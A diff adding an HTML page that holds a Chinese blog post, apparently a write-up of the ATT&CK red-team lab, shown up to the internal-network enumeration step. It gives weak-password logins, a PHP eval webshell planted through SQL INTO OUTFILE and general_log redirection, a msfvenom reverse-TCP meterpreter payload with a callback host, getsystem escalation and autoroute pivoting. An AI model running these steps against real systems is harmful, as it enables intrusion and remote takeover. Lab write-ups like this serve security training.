@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        ATT&CK红队评估(一) | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">ATT&CK红队评估(一)</div>
+        <div class="post-info">
+          
+  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a>
+
+
+          <span class="post-date">2023-05-10</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">WEB服务器 初探</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">phpstudy探针</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">目录扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">phpmyadmin</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">YXCMS</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">写webshell</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">峰回路转再看phpmyadmin</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">使用全局变量写shell</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">进入内网前的信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">信息搜集</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">对141 主机下手 （横向移动）</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">socks代理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">假的 ms17_010 ?</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">远程登录</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">问题1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">MSF派生CS</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">域控</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">写任务计划拿域控</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683617573984-19d364f3-bd2a-4183-b2f6-8dd9a7b94e55.png#averageHue=%23fdfdfd&clientId=u73000579-755b-4&from=paste&height=655&id=ua95a5f8a&originHeight=655&originWidth=1193&originalType=binary&ratio=2&rotation=0&showTitle=false&size=46362&status=done&style=none&taskId=ue22af745-55e0-4ca1-a8c7-0a583888e1c&title=&width=1193" alt="image.png"><br><a name="ukHY8"></a></p>
+<h1><span id="web服务器-初探">WEB服务器 初探</span></h1><p>对目标主机进行扫描探测 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683618086147-11896755-1527-45bf-b0c5-7b64fe02a04a.png#averageHue=%2318191b&clientId=u73000579-755b-4&from=paste&height=968&id=u7f70d641&originHeight=968&originWidth=2269&originalType=binary&ratio=2&rotation=0&showTitle=false&size=231844&status=done&style=none&taskId=uc812f5d8-e256-40a9-bc91-1a356805914&title=&width=2269" alt="image.png"><br>给出的信息 存在80端口 3306 数据库端口<br>先去访问他的80 端口查看是什么<br><a name="a2Dfb"></a></p>
+<h2><span id="phpstudy探针">phpstudy探针</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683618187538-ea1b32a5-2d7c-43ab-a6aa-8f480b9d151e.png#averageHue=%23fafaf9&clientId=u73000579-755b-4&from=paste&height=1420&id=u9d6cb602&originHeight=1420&originWidth=2458&originalType=binary&ratio=2&rotation=0&showTitle=false&size=370810&status=done&style=none&taskId=u1e30cb7f-40a3-42bf-aaea-81d6dbbdbb3&title=&width=2458" alt="image.png"><br>给出了绝对路径信息， C:&#x2F;phpStudy&#x2F;WWW<br>翻到最下面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683618283172-44c398bb-88f1-4221-9c39-bb48272c9543.png#averageHue=%23e6e7d1&clientId=u73000579-755b-4&from=paste&height=105&id=u21fb0fa3&originHeight=105&originWidth=1043&originalType=binary&ratio=2&rotation=0&showTitle=false&size=14326&status=done&style=none&taskId=uad48220c-7b1b-40bf-b808-4a0f2bb4034&title=&width=1043" alt="image.png"><br>存在用户名 ，密码  尝试使用弱口令 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root root<br>root 123456<br>admin admin <br>admin 123456<br>......<br></code></pre></td></tr></table></figure>
+<p>使用 root root<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683618604616-429b9867-fb05-4ced-a406-db7970088789.png#averageHue=%237e7f86&clientId=u73000579-755b-4&from=paste&height=438&id=uc54b0f5d&originHeight=438&originWidth=993&originalType=binary&ratio=2&rotation=0&showTitle=false&size=113576&status=done&style=none&taskId=u4e4dc1bf-ee08-43c5-a4d7-39727486c73&title=&width=993" alt="image.png"><br>连接到数据库正常 ，说明用户名密码没有错。<br>对目录进行扫描<br><a name="Qi5aK"></a></p>
+<h2><span id="目录扫描">目录扫描</span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683618730202-67630ac4-83a2-4423-937b-f5c92d315e9e.png#averageHue=%2318191b&clientId=u73000579-755b-4&from=paste&height=1482&id=ue651cfb7&originHeight=1482&originWidth=1778&originalType=binary&ratio=2&rotation=0&showTitle=false&size=321219&status=done&style=none&taskId=ue563ef6a-3486-43e9-b134-e7971f5e5ab&title=&width=1778" alt="image.png"><br><a name="zNrog"></a></p>
+<h2><span id="phpmyadmin">phpmyadmin</span></h2><p>基本上都是phpmyadmin 的目录 <br>刚好前面经过弱口令测试 得到数据库登录密码 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683618963201-0a61c3fe-fc76-4a1c-b306-72007abb9295.png#averageHue=%23fdfdfc&clientId=u73000579-755b-4&from=paste&height=883&id=u07f3b3c3&originHeight=883&originWidth=2085&originalType=binary&ratio=2&rotation=0&showTitle=false&size=69303&status=done&style=none&taskId=uc7405e18-dd1f-4b81-ab5c-17f10a8589e&title=&width=2085" alt="image.png"><br>使用弱口令登录<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683618992888-84127548-b2b2-4514-a3df-73caf562a74a.png#averageHue=%23f0f0f0&clientId=u73000579-755b-4&from=paste&height=1075&id=ue3d90908&originHeight=1075&originWidth=2492&originalType=binary&ratio=2&rotation=0&showTitle=false&size=225509&status=done&style=none&taskId=ue79cb617-7548-4bc2-b805-9216ade515e&title=&width=2492" alt="image.png"><br>登录之后查看数据库版本，数据库信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683619128486-176ee871-d522-45a7-9049-0acea5938dc0.png#averageHue=%23efefee&clientId=u73000579-755b-4&from=paste&height=899&id=u1e7da418&originHeight=899&originWidth=2851&originalType=binary&ratio=2&rotation=0&showTitle=false&size=194814&status=done&style=none&taskId=ua51d9e33-2d34-4dcd-b175-0fc57669721&title=&width=2851" alt="image.png"><br>数据库版本信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Server: localhost via TCP/IP<br>Software: MySQL<br>Software version: 5.5.53 - MySQL Community Server (GPL)<br>Protocol version: 10<br>User: root@localhost<br>Server charset: UTF-8 Unicode (utf8)<br></code></pre></td></tr></table></figure>
+<p>先放着</p>
+<p><a name="BG8QB"></a></p>
+<h2><span id="yxcms">YXCMS</span></h2><p>还发现存在一个yxcms<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683619384578-781018a7-9d07-4b54-9e43-d61ec2933ea4.png#averageHue=%23e2e4db&clientId=u73000579-755b-4&from=paste&height=1455&id=uc2b64ff3&originHeight=1455&originWidth=2603&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1928324&status=done&style=none&taskId=uf8afffcc-c25a-4fc7-b715-eb8e9e257c6&title=&width=2603" alt="image.png"><br>找了找xycms 的后台地址</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.145.145/yxcms/index.php?r=admin/index/login">http://192.168.145.145/yxcms/index.php?r=admin/index/login</a></p>
+</blockquote>
+<p>r 后面接的是地址<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683619888135-1c151d56-d848-477b-a75a-38a31774f1e8.png#averageHue=%23f7f7f7&clientId=u73000579-755b-4&from=paste&height=1220&id=udf30b216&originHeight=1220&originWidth=1994&originalType=binary&ratio=2&rotation=0&showTitle=false&size=83315&status=done&style=none&taskId=u5786a0c1-23a7-49fb-a915-7ea1b426825&title=&width=1994" alt="image.png"><br>经过百度 ，Google 发现 xycms 存在弱口令 以及 写phpshell 的 漏洞<br>使用弱口令 登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin 123456<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683620390788-4153a8cb-da8d-4fcc-bd69-c63c23647b63.png#averageHue=%23fbfafa&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1386&id=u40a6fd5a&originHeight=1386&originWidth=2804&originalType=binary&ratio=1&rotation=0&showTitle=false&size=354554&status=done&style=none&taskId=ua7513a87-cc1f-428d-9993-e1c3b84e6bd&title=&width=2804" alt="image.png"><br><a name="Zf0rr"></a></p>
+<h3><span id="写webshell">写webshell</span></h3><p>前台模版 –&gt; 编辑php文件 —&gt; 写shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683620752345-45361df7-cfda-47d7-b253-62d0c1f23844.png#averageHue=%23fafaf9&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1362&id=u8bd5ac60&originHeight=1362&originWidth=2806&originalType=binary&ratio=1&rotation=0&showTitle=false&size=387607&status=done&style=none&taskId=u6fcc3500-5e11-44cd-bb47-88419123a90&title=&width=2806" alt="image.png"><br>写简单的一句话<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683621130614-93add088-e4ee-415e-a946-029838697d92.png#averageHue=%23fefefe&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1039&id=u54240e21&originHeight=1039&originWidth=1614&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38820&status=done&style=none&taskId=u43519043-a178-44af-b072-6f15603974f&title=&width=1614" alt="image.png"></p>
+<p>路径是存在于</p>
+<blockquote>
+<p>yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;acomment.php</p>
+</blockquote>
+<p>完整连接</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.145.145/yxcms/protected/apps/default/view/default/acomment.php">http://192.168.145.145/yxcms/protected/apps/default/view/default/acomment.php</a></p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683621196169-30e86ac5-554a-47e9-9412-7ee5ac3db71a.png#averageHue=%23efefef&clientId=ub9e8dd7a-1ab9-4&from=paste&height=897&id=uc334dc01&originHeight=897&originWidth=1123&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97836&status=done&style=none&taskId=ud650e935-aff8-482c-8456-4e29f736caa&title=&width=1123" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683621207433-7491f31c-d786-4e7d-a87f-2670a060eade.png#averageHue=%23f0f0f0&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1116&id=uea5507ca&originHeight=1116&originWidth=2042&originalType=binary&ratio=1&rotation=0&showTitle=false&size=241912&status=done&style=none&taskId=u21f848c6-50f3-4442-8af3-103ca8c411d&title=&width=2042" alt="image.png"><br>连接成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683621469152-3782683f-6dc2-4316-9df2-456f1dc7a51a.png#averageHue=%23141414&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1044&id=u6a33187f&originHeight=1044&originWidth=1482&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129308&status=done&style=none&taskId=u0b1cda26-0108-40a1-81fb-e2fe1871e78&title=&width=1482" alt="image.png"><br>ok，转过头来看 phpmyadmin<br><a name="ZKcDS"></a></p>
+<h2><span id="峰回路转再看phpmyadmin">峰回路转再看phpmyadmin</span></h2><p>再次登录 phpmyadmin<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683622167309-03065fff-7c0f-4b62-ae47-49a469fbf3dc.png#averageHue=%23f2f2f2&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1028&id=u6a33bd43&originHeight=1028&originWidth=2737&originalType=binary&ratio=1&rotation=0&showTitle=false&size=182080&status=done&style=none&taskId=u417c9add-9050-4c8f-928a-6d2e0d873f2&title=&width=2737" alt="image.png"><br>一般phpmyadmin 都是可以执行 sql语句的 所以可以直接使用select into outfile直接写入shell<br>phpmyadmin getshell 常用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1、select into outfile直接写入<br>2、开启全局日志getshell<br>3、使用慢查询日志getsehll<br>4、使用错误日志getshell<br>5、利用phpmyadmin4.8.x本地文件包含漏洞getshell<br></code></pre></td></tr></table></figure>
+<p>先尝试 select into outfile<br>select into outfile写入shell，需要知道网站的绝对路径，比较容易失败。<br>使用 select @@basedir 报绝对路径 ，当然从探针哪里就可以看到绝对路径 ，基本都在phpstudy路径下面<br>写shell呢，就写在 www&#x2F; 下面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683622415375-a6632b06-1379-4815-8e8c-a2e5abc215d4.png#averageHue=%23f6f6f6&clientId=ub9e8dd7a-1ab9-4&from=paste&height=560&id=ud563714f&originHeight=560&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64558&status=done&style=none&taskId=u75a8d501-90c4-4322-9815-b4c7dfe4ef4&title=&width=1206" alt="image.png"><br>先查看是否有写入权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683622618146-9f53adf0-edb8-4fb0-99aa-17cdf7d84873.png#averageHue=%23f9f9f9&clientId=ub9e8dd7a-1ab9-4&from=paste&height=373&id=u9f649c02&originHeight=373&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28939&status=done&style=none&taskId=u3d7cc26c-fc44-4e05-9130-afdcda25ae9&title=&width=887" alt="image.png"><br>如果值为文件夹目录，则只允许修改目录下的文件，如果值为NULL则为禁止。这里不允许修改 ，无法使用这个方法写shell<br>但这里还是把写shell的代码贴出来 ，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select load_file(&#x27;C:/phpstudy/www/a.php&#x27;)<br>select &#x27;&lt;?php eval($_POST[cmd]); ?&gt;&#x27; into outfile &#x27;C:/phpstudy/www/a.php&#x27;;<br></code></pre></td></tr></table></figure>
+<p><a name="OEqR5"></a></p>
+<h3><span id="使用全局变量写shell">使用全局变量写shell</span></h3><p><strong>检测全局变量(general_log、general_log file)</strong></p>
+<ol>
+<li>general log 指的是日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF代表关闭。</li>
+<li>general log file 指的是日志的保存路径。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SHOW VARIABLES LIKE &#x27;general%&#x27;<br></code></pre></td></tr></table></figure>
+<img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683623090355-b50c574c-d5de-4eab-b05b-d4d0da73ca61.png#averageHue=%23f8f7f7&clientId=ub9e8dd7a-1ab9-4&from=paste&height=274&id=u95156584&originHeight=274&originWidth=785&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20376&status=done&style=none&taskId=u3e33a98d-96e7-4b04-ad55-152edb8ffca&title=&width=785" alt="image.png"><br>general_log默认关闭，以及日志的存储路径 。<br>全局日志开启并将保存日志的目录设为web目录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set global general_log=on;# 开启日志<br><br>set global general_log_file=&#x27;C:/phpStudy/WWW/yxcms/rz.php&#x27;;# 设置日志位置为网站目录<br></code></pre></td></tr></table></figure>
+再去查询<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683624330618-0d9ba9b8-6d59-4eee-b1b7-1f50c4885344.png#averageHue=%23f7f7f7&clientId=ub9e8dd7a-1ab9-4&from=paste&height=425&id=u719d5ca6&originHeight=425&originWidth=1303&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40856&status=done&style=none&taskId=u4717aa8a-a835-4b4c-8fef-2460f304bf1&title=&width=1303" alt="image.png"><br>就会发现开启<br>现在执行 select’<?php eval($_POST[cmd]); ?>‘ 语句就写入到 rz.php文件里面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683624418081-8b978f13-34ae-4f03-8495-e0e7e1cf592d.png#averageHue=%23f3f3f2&clientId=ub9e8dd7a-1ab9-4&from=paste&height=433&id=ue0592236&originHeight=433&originWidth=883&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61234&status=done&style=none&taskId=u65180c89-ebaa-4dbe-8d4b-bd04e37bf2d&title=&width=883" alt="image.png"><br>去访问就好了，<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683624490193-c7a3e5d9-1d49-44da-8463-f4e539f0daa8.png#averageHue=%23efefef&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1065&id=ue83f9e22&originHeight=1065&originWidth=1565&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126345&status=done&style=none&taskId=ub7c219a1-2d47-4f8b-9d83-7ba0cc08c3a&title=&width=1565" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683624503788-3900e3e8-277c-49f0-ac61-a4723039afab.png#averageHue=%23f3f3f3&clientId=ub9e8dd7a-1ab9-4&from=paste&height=925&id=u5ffdbbc4&originHeight=925&originWidth=1980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144118&status=done&style=none&taskId=uaeb10b38-7ad6-4bea-ae93-181fafa26cd&title=&width=1980" alt="image.png"><br>成功连接shell<br><a name="Qe7SQ"></a></li>
+</ol>
+<h1><span id="进入内网前的信息搜集">进入内网前的信息搜集</span></h1><p>先查看IP地址<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683633581566-be2ea228-fa85-4519-aee0-cebe7f9388fa.png#averageHue=%23030202&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1391&id=ue0daabac&originHeight=1391&originWidth=1534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=245979&status=done&style=none&taskId=u1ca5f8b1-f3b0-49a6-9eac-e2badcd108b&title=&width=1534" alt="image.png"><br>存在两张网卡 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">192.168.145.145 外网网卡<br>192.168.52.143  内网网卡<br></code></pre></td></tr></table></figure>
+<p>让他上线MSF或者CS<br>先生成一个木马上线MSF 提权到system</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.145.130 LPORT=4444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683634130250-f04c502e-3c33-4a88-9958-cc88882a51a4.png#averageHue=%2318191b&clientId=ub9e8dd7a-1ab9-4&from=paste&height=314&id=u68144fce&originHeight=314&originWidth=1838&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63804&status=done&style=none&taskId=ue58ed579-5df5-4c77-af18-5178fd4a36d&title=&width=1838" alt="image.png"><br>上传shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683634422076-3bdf9ed6-f58e-42e9-b220-925ee84433ac.png#averageHue=%23f4f4f3&clientId=ub9e8dd7a-1ab9-4&from=paste&height=719&id=uf1cfc795&originHeight=719&originWidth=1609&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90034&status=done&style=none&taskId=u2fda397d-4abf-49cd-a7f4-60782bbbde2&title=&width=1609" alt="image.png">运行上传的shell<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683634643439-2c8d8f38-8de2-46aa-a29b-4219a5841dc9.png#averageHue=%23040404&clientId=ub9e8dd7a-1ab9-4&from=paste&height=331&id=u6f3127ab&originHeight=331&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28954&status=done&style=none&taskId=udcbd278a-5784-4952-931b-9d646fc31fb&title=&width=1089" alt="image.png"><br>设置监听<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683634673431-ea5a1b14-b20d-41e0-a384-bcceb9324512.png#averageHue=%2317181a&clientId=ub9e8dd7a-1ab9-4&from=paste&height=787&id=u35e5ba7d&originHeight=787&originWidth=1650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120283&status=done&style=none&taskId=u88886d78-3105-4442-83f3-407e9e4393b&title=&width=1650" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683634687224-8bda4817-565b-415c-b889-0efbe71b6c0a.png#averageHue=%23161719&clientId=ub9e8dd7a-1ab9-4&from=paste&height=218&id=ubd841b1e&originHeight=218&originWidth=1768&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17698&status=done&style=none&taskId=u90fac9d8-3984-499c-af25-47efa3e1d12&title=&width=1768" alt="image.png"><br>就反弹shell了 <br>提权 –<br>使用最简的 getsystem试一试，因为他现在administrator 权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683634743368-ca122eed-fedd-46e8-b880-b9c02b9aa559.png#averageHue=%2318191b&clientId=ub9e8dd7a-1ab9-4&from=paste&height=230&id=u8595c159&originHeight=230&originWidth=1444&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34282&status=done&style=none&taskId=u7be09bd9-d261-479c-9c8d-ba140a80a35&title=&width=1444" alt="image.png"><br>这样就成功提权到system权限了<br><a name="VpVch"></a></p>
+<h2><span id="信息搜集">信息搜集</span></h2><p>内网路由<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683634987266-f0df3e1f-9a6e-4fbc-a945-f6e20123c236.png#averageHue=%231f2022&clientId=ub9e8dd7a-1ab9-4&from=paste&height=127&id=u7caee95e&originHeight=127&originWidth=568&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12058&status=done&style=none&taskId=u550b81a0-06ac-41ef-ada2-e9b671a9130&title=&width=568" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter &gt; run get_local_subnets <br>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>[!] Example: run post/multi/manage/autoroute OPTION=value [...]<br>Local subnet: 169.254.0.0/255.255.0.0<br>Local subnet: 192.168.52.0/255.255.255.0<br>Local subnet: 192.168.145.0/255.255.255.0<br></code></pre></td></tr></table></figure>
+<p>内网网段应该是192.168.52.0&#x2F;24<br>添加前往 52网段的路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run autoroute  -s 192.168.52.0/24<br></code></pre></td></tr></table></figure>
+<p>查看添加后的路由<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683635153283-13eb7f17-04de-473d-8384-24b4acb24126.png#averageHue=%23191a1c&clientId=ub9e8dd7a-1ab9-4&from=paste&height=229&id=u889d4501&originHeight=229&originWidth=568&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12862&status=done&style=none&taskId=u3ffae56d-b62b-404e-a9fd-3934a053a18&title=&width=568" alt="image.png"><br>基本的使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">run autoroute -p                  <br>–&gt;查看域环境<br>use incognito                     <br>–&gt;调用劫持域管理模块<br>list_tokens -u                     <br>–&gt;查看当前目标主机的域环境信息<br>添加去往目标网段的转发路由<br>run autoroute –s &lt;目标内网地址网段&gt;<br>run autoroute -s 0.0.0.0/0 <br>添加到达0.0.0.0/0的路由<br>查看路由添加情况<br>run autoroute -p<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>ipconfig &#x2F;all  查看ip 和是否存在域</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683635945536-8a6eaaf8-8bee-465e-b4d1-c5c83aa448a2.png#averageHue=%231a1b1d&clientId=ub9e8dd7a-1ab9-4&from=paste&height=657&id=u99e976f7&originHeight=657&originWidth=724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54771&status=done&style=none&taskId=u31a1a762-f562-4eb0-b895-7f0961f1265&title=&width=724" alt="image.png"><br>存在 god.org 域的 <br>查看路由信息<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683636040575-93532863-127e-4ad4-add9-919e4c64f485.png#averageHue=%231a1b1d&clientId=ub9e8dd7a-1ab9-4&from=paste&height=1204&id=u3ffed2e5&originHeight=1204&originWidth=893&originalType=binary&ratio=1&rotation=0&showTitle=false&size=106766&status=done&style=none&taskId=ube1c3790-37f3-44eb-b522-682f3541f9e&title=&width=893" alt="image.png"><br>查看共享 net share<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683636109941-20da608b-dc86-4ca4-966f-b03b49e798f0.png#averageHue=%2318191b&clientId=ub9e8dd7a-1ab9-4&from=paste&height=194&id=u6ba5f5e5&originHeight=194&originWidth=713&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11459&status=done&style=none&taskId=u8d8ced30-aa46-4016-be49-eb752540961&title=&width=713" alt="image.png"><br>既然存在域查看域用户<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683636272804-3837bf1e-dd20-43d9-8216-601189544529.png#averageHue=%23191a1c&clientId=ub9e8dd7a-1ab9-4&from=paste&height=218&id=ub40d3c4b&originHeight=218&originWidth=699&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11774&status=done&style=none&taskId=u3af12a2c-9505-4b1b-9ac4-a87ebd7f034&title=&width=699" alt="image.png"><br>查看主域</p>
+<blockquote>
+<p>net time &#x2F;domain</p>
+</blockquote>
